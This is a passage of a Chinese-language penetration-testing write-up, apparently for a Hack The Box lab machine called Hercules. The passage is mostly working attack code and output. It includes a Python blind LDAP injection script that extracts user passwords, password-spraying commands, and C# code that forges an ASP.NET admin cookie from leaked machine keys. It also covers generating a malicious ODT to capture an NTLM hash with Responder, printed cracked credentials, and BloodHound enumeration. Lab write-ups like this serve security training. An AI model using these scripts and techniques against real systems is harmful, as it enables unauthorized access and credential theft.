+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s1">&#39;)&#39;</span> <span class="ow">in</span> <span class="n">escaped_desc</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">escaped_desc</span> <span class="o">=</span> <span class="n">escaped_desc</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;)&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">29&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">*)(description=</span><span class="si">{</span><span class="n">escaped_desc</span><span class="si">}</span><span class="s2">*&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># Check if user has description field</span>
+</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">*)(description=*&#34;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Double URL encode</span>
+</span></span><span class="line"><span class="cl">    <span class="n">encoded_payload</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;%</span><span class="si">{</span><span class="n">byte</span><span class="si">:</span><span class="s1">02X</span><span class="si">}</span><span class="s1">&#39;</span> <span class="k">for</span> <span class="n">byte</span> <span class="ow">in</span> <span class="n">payload</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;Username&#34;</span><span class="p">:</span> <span class="n">encoded_payload</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;Password&#34;</span><span class="p">:</span> <span class="s2">&#34;test&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;RememberMe&#34;</span><span class="p">:</span> <span class="s2">&#34;false&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;__RequestVerificationToken&#34;</span><span class="p">:</span> <span class="n">token</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">TARGET_URL</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="n">VERIFY_TLS</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">SUCCESS_INDICATOR</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">enumerate_description</span><span class="p">(</span><span class="n">username</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Enumerate description/password field character by character&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># Character set - most common password chars first for optimization</span>
+</span></span><span class="line"><span class="cl">    <span class="n">charset</span> <span class="o">=</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span>
+</span></span><span class="line"><span class="cl">        <span class="n">string</span><span class="o">.</span><span class="n">digits</span> <span class="o">+</span>
+</span></span><span class="line"><span class="cl">        <span class="n">string</span><span class="o">.</span><span class="n">ascii_uppercase</span> <span class="o">+</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;!@#$_*-.&#34;</span> <span class="o">+</span>  <span class="c1"># Common special chars</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;%^&amp;()=+[]</span><span class="si">{}</span><span class="s2">|;:&#39;,&lt;&gt;?/`~</span><span class="se">\&#34;</span><span class="s2"> </span><span class="se">\\</span><span class="s2">&#34;</span>  <span class="c1"># Less common</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">[*] Checking user: </span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># First check if user has description</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">test_ldap_injection</span><span class="p">(</span><span class="n">username</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[-] User </span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2"> has no description field&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] User </span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2"> has a description field, enumerating...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">description</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">max_length</span> <span class="o">=</span> <span class="mi">50</span>
+</span></span><span class="line"><span class="cl">    <span class="n">no_char_count</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">position</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">max_length</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">found</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">charset</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">test_desc</span> <span class="o">=</span> <span class="n">description</span> <span class="o">+</span> <span class="n">char</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">test_ldap_injection</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">test_desc</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">                <span class="n">description</span> <span class="o">+=</span> <span class="n">char</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;  Position </span><span class="si">{</span><span class="n">position</span><span class="si">}</span><span class="s2">: &#39;</span><span class="si">{</span><span class="n">char</span><span class="si">}</span><span class="s2">&#39; -&gt; Current: </span><span class="si">{</span><span class="n">description</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">found</span> <span class="o">=</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">                <span class="n">no_char_count</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">                <span class="k">break</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># Small delay to avoid rate limiting</span>
+</span></span><span class="line"><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">found</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">no_char_count</span> <span class="o">+=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">no_char_count</span> <span class="o">&gt;=</span> <span class="mi">2</span><span class="p">:</span>  <span class="c1"># Stop after 2 positions with no chars</span>
+</span></span><span class="line"><span class="cl">                <span class="k">break</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">description</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Complete: </span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2"> =&gt; </span><span class="si">{</span><span class="n">description</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">description</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;=&#34;</span><span class="o">*</span><span class="mi">60</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Hercules LDAP Description/Password Enumeration&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Testing </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">KNOWN_USERS</span><span class="p">)</span><span class="si">}</span><span class="s2"> users&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;=&#34;</span><span class="o">*</span><span class="mi">60</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">found_passwords</span> <span class="o">=</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Priority users to test first</span>
+</span></span><span class="line"><span class="cl">    <span class="n">priority_users</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;web_admin&#34;</span><span class="p">,</span> <span class="s2">&#34;auditor&#34;</span><span class="p">,</span> <span class="s2">&#34;Administrator&#34;</span><span class="p">,</span> <span class="s2">&#34;natalie.a&#34;</span><span class="p">,</span> <span class="s2">&#34;ken.w&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">other_users</span> <span class="o">=</span> <span class="p">[</span><span class="n">u</span> <span class="k">for</span> <span class="n">u</span> <span class="ow">in</span> <span class="n">KNOWN_USERS</span> <span class="k">if</span> <span class="n">u</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">priority_users</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Test priority users first</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">user</span> <span class="ow">in</span> <span class="n">priority_users</span> <span class="o">+</span> <span class="n">other_users</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">password</span> <span class="o">=</span> <span class="n">enumerate_description</span><span class="p">(</span><span class="n">user</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">password</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">found_passwords</span><span class="p">[</span><span class="n">user</span><span class="p">]</span> <span class="o">=</span> <span class="n">password</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># Save results immediately</span>
+</span></span><span class="line"><span class="cl">            <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;hercules_passwords.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;a&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">user</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">[+] FOUND: </span><span class="si">{</span><span class="n">user</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="s2">&#34;=&#34;</span><span class="o">*</span><span class="mi">60</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;ENUMERATION COMPLETE&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;=&#34;</span><span class="o">*</span><span class="mi">60</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">found_passwords</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">Found </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">found_passwords</span><span class="p">)</span><span class="si">}</span><span class="s2"> passwords:&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">user</span><span class="p">,</span> <span class="n">pwd</span> <span class="ow">in</span> <span class="n">found_passwords</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;  </span><span class="si">{</span><span class="n">user</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">pwd</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">No passwords found&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103110535000-1258202512.png" alt="image-20251103110531768"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">johnathan.j:change*th1s_p@ssw<span class="o">()</span>rd!!
+</span></span></code></pre></div><p>但是还是登录不上web后台，尝试密码喷洒</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nxc ldap 10.10.11.91 -u users.txt  -p <span class="s1">&#39;change*th1s_p@ssw()rd!!&#39;</span> -k
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103111210403-1510336064.png" alt="image-20251103111207434"></p>
+<p>注意到<code>ken.w</code>用户的报错是时间差，用这个用户登录</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ken.w:change*th1s_p@ssw<span class="o">()</span>rd!!
+</span></span></code></pre></div><p>发现有下载文件和上传文件两个功能可能被利用</p>
+<h2 id="任意文件读取cookie伪造越权">
+<a class="header-anchor" href="#%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e8%af%bb%e5%8f%96cookie%e4%bc%aa%e9%80%a0%e8%b6%8a%e6%9d%83"></a>
+任意文件读取+Cookie伪造越权
+</h2><p>先看下载，抓包看一下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103134812676-1619266896.png" alt="image-20251103134808866"></p>
+<p>之前可以看出这是个<code>.net</code>网站，所以重点文件找<code>web.config</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">../../web.config
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">发现：
+</span></span><span class="line"><span class="cl"><span class="nv">decryptionKey</span><span class="o">=</span><span class="s2">&#34;B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">validation</span><span class="o">=</span><span class="s2">&#34;HMACSHA256&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">validationKey</span><span class="o">=</span><span class="s2">&#34;EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F
+</span></span></span><span class="line"><span class="cl"><span class="s2">9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80&#34;</span>
+</span></span></code></pre></div><blockquote>
+<p>decryptionKey是ASP.NET用来加密机密数据（例如Forms-Auth票证或ViewState）的对称密钥-通常使用类似AES的块密码。</p>
+<p>validationKey是用于计算/验证MAC（例如HMAC-SHA 256）的完整性密钥，因此服务器可以检测篡改。</p>
+<p>如果知道这两个密钥，他们可以制作一个paylaod，用decryptionKey加密它，并用validationKey生成一个有效的MAC；就可以伪造任何帐户（包括管理员）</p>
+</blockquote>
+<p>创建一个表单获取<code>admin</code>的<code>cookie</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1"># 创建一个新的控制台项目</span>
+</span></span><span class="line"><span class="cl">dotnet new console -o LegacyAuthConsole
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 添加版本为v2.0.5的AspNetCore.LegacyAuthCookieCompat 包</span>
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> LegacyAuthConsole
+</span></span><span class="line"><span class="cl">dotnet add package AspNetCore.LegacyAuthCookieCompat --version 2.0.5
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 把项目需要的包全部下载好</span>
+</span></span><span class="line"><span class="cl">dotnet restore
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 将目录下的Program.cs改成以下代码</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Security.Claims</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Threading.Tasks</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">AspNetCore.LegacyAuthCookieCompat</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Program</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">static</span> <span class="k">void</span> <span class="n">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">string</span> <span class="n">validationKey</span> <span class="p">=</span> 
+</span></span><span class="line"><span class="cl"><span class="s">&#34;EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kt">string</span> <span class="n">decryptionKey</span> <span class="p">=</span> 
+</span></span><span class="line"><span class="cl"><span class="s">&#34;B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kt">var</span> <span class="n">issueDate</span> <span class="p">=</span> <span class="n">DateTime</span><span class="p">.</span><span class="n">Now</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">var</span> <span class="n">expiryDate</span> <span class="p">=</span> <span class="n">issueDate</span><span class="p">.</span><span class="n">AddHours</span><span class="p">(</span><span class="m">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">var</span> <span class="n">formsAuthenticationTicket</span> <span class="p">=</span> <span class="k">new</span> <span class="n">FormsAuthenticationTicket</span><span class="p">(</span><span class="m">1</span><span class="p">,</span> <span class="s">&#34;web_admin&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl"><span class="n">issueDate</span><span class="p">,</span> <span class="n">expiryDate</span><span class="p">,</span> <span class="kc">false</span><span class="p">,</span> <span class="s">&#34;Web Administrators&#34;</span><span class="p">,</span> <span class="s">&#34;/&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kt">byte</span><span class="p">[]</span> <span class="n">decryptionKeyBytes</span> <span class="p">=</span> <span class="n">HexUtils</span><span class="p">.</span><span class="n">HexToBinary</span><span class="p">(</span><span class="n">decryptionKey</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">byte</span><span class="p">[]</span> <span class="n">validationKeyBytes</span> <span class="p">=</span> <span class="n">HexUtils</span><span class="p">.</span><span class="n">HexToBinary</span><span class="p">(</span><span class="n">validationKey</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kt">var</span> <span class="n">legacyFormsAuthenticationTicketEncryptor</span> <span class="p">=</span> <span class="k">new</span> 
+</span></span><span class="line"><span class="cl"><span class="n">LegacyFormsAuthenticationTicketEncryptor</span><span class="p">(</span><span class="n">decryptionKeyBytes</span><span class="p">,</span> <span class="n">validationKeyBytes</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl"><span class="n">ShaVersion</span><span class="p">.</span><span class="n">Sha256</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kt">var</span> <span class="n">encryptedText</span> <span class="p">=</span> 
+</span></span><span class="line"><span class="cl"><span class="n">legacyFormsAuthenticationTicketEncryptor</span><span class="p">.</span><span class="n">Encrypt</span><span class="p">(</span><span class="n">formsAuthenticationTicket</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="n">encryptedText</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1"># 编译</span>
+</span></span><span class="line"><span class="cl">dotnet build
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 运行当前 .NET 项目</span>
+</span></span><span class="line"><span class="cl">dotnet run
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103140529258-1074315152.png" alt="image-20251103140526092"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">9FF91A4D1B8F282E233170312372B975306FF0061E88B768F7A899EF59F6E0A0BD7B7A4F3738047F1C64C05A56C37265F22AADE6C5DB9203AC15E68DE5273AA5C514088384BCC3413792DFD9B34275AFACBAD3B7BABA7DBB945CE4E02EE6BB87676DDDC221C90DD60FF6070EDC19FE00C59AECF51F90CDA5C4752B5E7772C03AEAEB62D0D6280B72ADF83C64F857A81B089F4EF9791C29FE97427BAED6242C512572E2CF34CFA462541661185AAED93CB9C6BB60FC56B4955F27E1C8543A2AAC
+</span></span></code></pre></div><p>登录<code>ken.w</code>把上面的<code>cookie</code>换一下即可</p>
+<p>成功切换到<code>web admin</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103140701370-87310252.png" alt="image-20251103140657822"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103140747376-1048162703.png" alt="image-20251103140744510"></p>
+<p>发现仅让管理员上传文件（<code>FUZZ</code>后发现可以上传<code>.odt</code>和<code>.docx</code>）</p>
+<h2 id="文件上传ntlm反射">
+<a class="header-anchor" href="#%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0ntlm%e5%8f%8d%e5%b0%84"></a>
+文件上传+NTLM反射
+</h2><p>参考：https://github.com/lof1sec/Bad-ODF</p>
+<p>用这个脚本生成恶意的odt文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103142425840-1002063500.png" alt="image-20251103142422778"></p>
+<p>监听</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo responder -I tun0 -v
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103142556850-513730375.png" alt="image-20251103142553632"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">natalie.a::HERCULES:14c4381d2aded8fb:D26947A2D68515048A6352FE7154295A:010100000000000000D1C6AA604CDC01F2FBC445EC5286B50000000002000800320056004200490001001E00570049004E002D004C003900520056005000470032004800570055004C0004003400570049004E002D004C003900520056005000470032004800570055004C002E0032005600420049002E004C004F00430041004C000300140032005600420049002E004C004F00430041004C000500140032005600420049002E004C004F00430041004C000700080000D1C6AA604CDC010600040002000000080030003000000000000000000000000020000049C996027345DCB01B7A07074E2C570885C6F4D9502CB19ACBE777F8558A84560A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0036000000000000000000
+</span></span></code></pre></div><p>破解</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103142742374-1223977382.png" alt="image-20251103142739441"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Prettyprincess123! (natalie.a)
+</span></span></code></pre></div><h1 id="域信息收集分析">
+<a class="header-anchor" href="#%e5%9f%9f%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%88%86%e6%9e%90"></a>
+域信息收集+分析
+</h1><p>进行信息收集</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bloodhound-python -u natalie.a -p <span class="s1">&#39;Prettyprincess123!&#39;</span> -c All -d hercules.htb -ns 10.10.11.91 --zip --use-ldap 
+</span></span></code></pre></div><p>分析<code>natalie.a</code>，发现可以通过<code>GenericWrite</code>来横移到<code>bob.w</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103153247572-444159897.png" alt="image-20251103153244355"></p>
+<p>再看看哪些用户属于远程登录的组：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103151716470-1427368928.png" alt="image-20251103151713588"></p>
+<p><code>auditor</code>和<code>ashley.b</code>属于</p>
+<p>并且又看到<code>stephen.m</code>和<code>mark.s</code>属于<code>Security Helpdesk</code>组，然后<code>Security Helpdesk</code>组对<code>auditor</code>有<code>forcechangepassword</code>权限</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103152816288-1230137721.png" alt="image-20251103152812713"></p>
+<p>分析得知，我们需要得到<code>Security Helpdesk</code>组成员中的任意一个凭据，然后通过<code>ForceChangePassword</code>权限更改<code>auditor</code>的密码，从而远程登陆</p>
+<p>但是发现<code>bob.w</code>和<code>Security Helpdesk</code>组成员没有任何联系，只能先横移过去在检查有没有其他方法了</p>
+<p>利用<code>Genericwrite</code>权限来用影子证书来打<code>bob.w</code></p>
+<h1 id="shadow-credentials-攻击">
+<a class="header-anchor" href="#shadow-credentials-%e6%94%bb%e5%87%bb"></a>
+Shadow Credentials 攻击
+</h1><p>先请求<code>natalie.a</code>的<code>TGT</code></p>
